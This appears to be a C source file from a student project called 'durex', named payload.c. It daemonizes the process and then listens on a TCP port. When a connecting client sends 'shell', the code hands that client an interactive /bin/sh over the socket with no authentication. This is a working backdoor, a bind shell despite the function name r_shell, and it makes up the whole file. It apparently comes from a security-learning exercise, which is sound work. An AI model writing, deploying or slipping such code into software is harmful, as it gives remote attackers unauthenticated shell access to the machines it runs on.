/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   payload.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: eparisot <eparisot@42.student.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/05/25 14:55:42 by eparisot          #+#    #+#             */
/*   Updated: 2021/05/25 14:55:42 by eparisot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../includes/payload.h"

int daemonize(char* name, char* path, char* outfile, char* errfile, char* infile)
{
	pid_t pid;

	if (!path) 
	{ 
		path="/"; 
	}
    if (!name) 
	{ 
		name="durex_daemon"; 
	}
	if (!infile) 
	{ 
		infile="/dev/null"; 
	}
    if (!outfile) 
	{ 
		outfile="/dev/null"; 
	}
    if (!errfile) 
	{ 
		errfile="/dev/null"; 
	}

    /* Fork off the parent process */
    pid = fork();

    /* An error occurred */
    if (pid < 0)
        exit(EXIT_FAILURE);

    /* Success: Let the parent terminate */
    if (pid > 0)
        exit(EXIT_SUCCESS);

    /* On success: The child process becomes session leader */
    if (setsid() < 0)
        exit(EXIT_FAILURE);

    /* Catch, ignore and handle signals */
    //TODO: Implement a working signal handler */
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    /* Fork off for the second time*/
    pid = fork();

    /* An error occurred */
    if (pid < 0)
        exit(EXIT_FAILURE);

    /* Success: Let the parent terminate */
    if (pid > 0)
        exit(EXIT_SUCCESS);

    /* Set new file permissions */
    umask(0);

    /* Change the working directory to the root directory */
    /* or another appropriated directory */
    if (chdir("/"))
		exit(EXIT_FAILURE);

	//Close all open file descriptors
    int fd;
    for( fd=sysconf(_SC_OPEN_MAX); fd>0; --fd )
    {
        close(fd);
    }

	//reopen stdin, stdout, stderr
    stdin=fopen(infile,"r");   //fd=0
    stdout=fopen(outfile,"w+");  //fd=1
    stderr=fopen(errfile,"w+");  //fd=2

	return 0;
}

int r_shell()
{
	struct sockaddr_in server_address;
    int server_socket;
	int opt = 1;

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY;
    server_address.sin_port = htons(REMOTE_PORT);

    server_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (server_socket < 0)
	{
		printf("error opening socket\n");
		return -1;
	}

	if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)))
    {
        printf("error setting socket options\n");
		close(server_socket);
        return -1;
    }

    if (bind(server_socket, (const struct sockaddr *)&server_address, sizeof(server_address)))
	{
		printf("error binding socket\n");
		close(server_socket);
        return -1;
	}

	if (listen(server_socket, 3) < 0)
	{
		printf("error listening socket\n");
		close(server_socket);
        return -1;
	}

	struct sockaddr_in client_address;
	socklen_t client_addr_asize;
	int client_socket;
	char buffer[1024] = {0};
	char hello_msg[] = "Hello !\n";

	if ((client_socket = accept(server_socket, (struct sockaddr *)&client_address, &client_addr_asize)) < 0)
    {
        printf("error accepting socket connexion\n");
        close(server_socket);
        return -1;
    }
	
    send(client_socket , hello_msg , strlen(hello_msg) , 0 );
    printf("Hello message sent\n");

	if (read(client_socket , buffer, 1024) < 0)
	{
		printf("error reading socket content\n");
        close(server_socket);
        return -1;
	}
	//printf("%s", buffer);
	if (strncmp(buffer, "shell", 5) == 0)
	{
		printf("Starting reverse shell\n");
		dup2(client_socket, 0);
		dup2(client_socket, 1);
		dup2(client_socket, 2);
		char * const argv[] = {"/bin/sh", NULL};
    	execve("/bin/sh", argv, NULL);
	}

	close(client_socket);
	close(server_socket);
	return 0;
}

int main(void)
{
	if (daemonize("durex_daemon", "/", "/dev/fd/1", "/dev/fd/2", "/dev/fd/0"))
	{
		printf("Failed to run daemon\n");
		return EXIT_FAILURE;
	}

	while (1)
	{
		r_shell();
		break;
	}

	printf("durex stopped\n");
	
	return EXIT_SUCCESS;
}